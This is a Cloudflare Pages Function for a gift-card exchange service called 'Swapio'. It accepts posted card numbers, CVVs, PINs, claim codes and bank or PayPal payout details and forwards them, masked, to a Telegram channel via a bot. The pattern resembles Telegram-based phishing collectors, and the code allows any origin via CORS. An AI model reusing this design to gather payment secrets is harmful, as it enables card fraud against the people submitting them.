/**
 * Cloudflare Pages Function — Telegram submission handler
 *
 * Environment variables (set in Cloudflare Pages dashboard):
 *   TELEGRAM_BOT_TOKEN  — Bot token from @BotFather
 *   TELEGRAM_CHANNEL_ID — Channel/chat ID (e.g. -1001234567890)
 */

export async function onRequestPost(context) {
  const { request, env } = context;

  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json',
  };

  try {
    const botToken = env.TELEGRAM_BOT_TOKEN;
    const channelId = env.TELEGRAM_CHANNEL_ID;

    if (!botToken || !channelId) {
      console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHANNEL_ID');
      return new Response(
        JSON.stringify({ error: 'Server configuration error' }),
        { status: 500, headers: corsHeaders }
      );
    }

    const data = await request.json();

    const isContact = data.type === 'contact';
    const required = isContact
      ? ['orderCode', 'email', 'message']
      : ['orderCode', 'email', 'cardBrand', 'cardBalance', 'payoutMethod'];

    for (const field of required) {
      if (!data[field]) {
        return new Response(
          JSON.stringify({ error: `Missing required field: ${field}` }),
          { status: 400, headers: corsHeaders }
        );
      }
    }

    const timestamp = data.timestamp || new Date().toISOString();

    let message;

    if (isContact) {
      message = [
        '📬 *New Swapio Contact Message*',
        '',
        `📋 *Reference:* \`${data.orderCode}\``,
        `👤 *Name:* ${escapeMarkdown(data.fullName || 'Not provided')}`,
        `📧 *Email:* ${escapeMarkdown(data.email)}`,
        `📌 *Subject:* ${escapeMarkdown(data.subject || 'No subject')}`,
        '',
        `💬 *Message:*`,
        escapeMarkdown(data.message || 'No message'),
        '',
        `🕐 *Submitted:* ${timestamp}`,
      ].join('\n');
    } else {
      const payoutAmount = data.payoutAmount || 'N/A';
      const cardLines = formatCardDetails(data.cardDetails);
      const payoutLines = formatPayoutDetails(data.payoutMethod, data.payoutDetails, data.payoutAccount);

      message = [
        '🔄 *New Swapio Submission*',
        '',
        `📋 *Order Code:* \`${data.orderCode}\``,
        `📧 *Email:* ${escapeMarkdown(data.email)}`,
        `👤 *Name:* ${escapeMarkdown(data.fullName || 'Not provided')}`,
        '',
        `🎁 *Card:* ${escapeMarkdown(data.cardBrand)} — $${data.cardBalance}`,
        `💰 *Payout:* $${payoutAmount} via ${escapeMarkdown(data.payoutMethod)}`,
        ...payoutLines,
        '',
        '📄 *Card Details:*',
        ...cardLines,
        '',
        `🕐 *Submitted:* ${timestamp}`,
      ].join('\n');
    }

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: channelId,
        text: message,
        parse_mode: 'Markdown',
      }),
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResult.ok) {
      console.error('Telegram API error:', telegramResult);
      return new Response(
        JSON.stringify({ error: 'Failed to send notification' }),
        { status: 502, headers: corsHeaders }
      );
    }

    return new Response(
      JSON.stringify({ success: true, orderCode: data.orderCode }),
      { status: 200, headers: corsHeaders }
    );
  } catch (err) {
    console.error('Submit handler error:', err);
    return new Response(
      JSON.stringify({ error: 'Internal server error' }),
      { status: 500, headers: corsHeaders }
    );
  }
}

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}

function escapeMarkdown(text) {
  if (!text) return '';
  return String(text).replace(/[_*[\]()~`>#+\-=|{}.!\\]/g, '\\$&');
}

function maskSensitive(value) {
  if (!value) return 'Not provided';
  const str = String(value);
  if (str.length <= 4) return '****';
  return str.slice(0, 2) + '****' + str.slice(-2);
}

function formatCardDetails(details) {
  if (!details || typeof details !== 'object') {
    return [`• Card info: ${escapeMarkdown(maskSensitive(''))}`];
  }

  const labels = {
    cardNumber: 'Card Number',
    expirationDate: 'Expiration',
    cvv: 'CVV',
    pin: 'PIN',
    claimCode: 'Claim Code',
    redemptionCode: 'Redemption Code',
    giftCode: 'Gift Code',
    cardCode: 'Card Code',
  };

  return Object.entries(details)
    .filter(([, value]) => value)
    .map(([key, value]) => {
      const label = labels[key] || key;
      const masked = ['cvv', 'pin'].includes(key) ? maskSensitive(value) : maskSensitive(value);
      return `• ${label}: ${escapeMarkdown(masked)}`;
    });
}

function formatPayoutDetails(method, details, fallback) {
  if (!details || typeof details !== 'object') {
    return [`🏦 *Account:* ${escapeMarkdown(fallback || 'Not provided')}`];
  }

  const labels = {
    paypalEmail: 'PayPal Email',
    cashtag: 'Cash App Tag',
    zelleEmail: 'Zelle Email',
    routingNumber: 'Routing Number',
    accountNumber: 'Account Number',
  };

  return Object.entries(details)
    .filter(([, value]) => value)
    .map(([key, value]) => {
      const label = labels[key] || key;
      const display = key === 'accountNumber' || key === 'routingNumber'
        ? maskSensitive(value)
        : escapeMarkdown(value);
      return `🏦 *${label}:* ${display}`;
    });
}